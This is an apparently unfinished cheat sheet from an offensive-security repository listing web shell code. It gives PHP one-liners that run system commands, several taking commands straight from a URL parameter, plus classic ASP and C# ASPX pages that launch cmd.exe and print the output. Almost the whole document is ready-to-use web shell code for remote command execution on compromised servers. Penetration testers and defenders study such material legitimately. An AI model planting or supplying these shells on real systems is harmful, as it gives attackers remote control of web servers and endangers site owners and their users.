# WebShells

```
> **Disclaimer**  
> This repository is currently under construction. The content is being updated and expanded. New file extensions and detailed descriptions will be added soon. Stay tuned for more additions. Happy hacking!

Currently this document outlines the usage of various PHP file extensions commonly used for web shells and their potential to be exploited for Remote Code Execution (RCE).
```

# PHP Webshells

#### 1. Basic Command Execution Using system()

```php
<?php system("whoami"); ?>
```

#### 2. Passing Commands via URL Parameters with system() (shell.php?cmd=whoami)

```php
<?php system($_GET['cmd']); ?>
```

#### 3. Executing System Commands with passthru()

```php
<?php passthru($_GET['cmd']); ?>
```

#### 4. Capturing Command Output Using shell\_exec()

```php
<?php echo shell_exec("whoami"); ?>
```

#### 5. Using exec() to Run Commands (Outputs Only Last Line)

```php
<?php echo exec("whoami"); ?>
```

#### 6. Storing Full Output from exec() as an Array

```php
<?php
exec("ls -la", $output);
print_r($output);
?>
```

#### 7. Backtick Syntax for Simple Command Execution

```php
<?php echo `whoami`; ?>
```

#### 8. Legacy preg\_replace() Execution Trick (Deprecated)

```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```

# ASPX Webshells

#### 1. Classic VBScript-Style ASP Command Execution

```asp
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

#### 2. Executing Commands in C# ASPX with Output Display

```aspx
<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c whoami";
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    string output = p.StandardOutput.ReadToEnd();
    Response.Write("<pre>" + output + "</pre>");
}
</script>
```

####

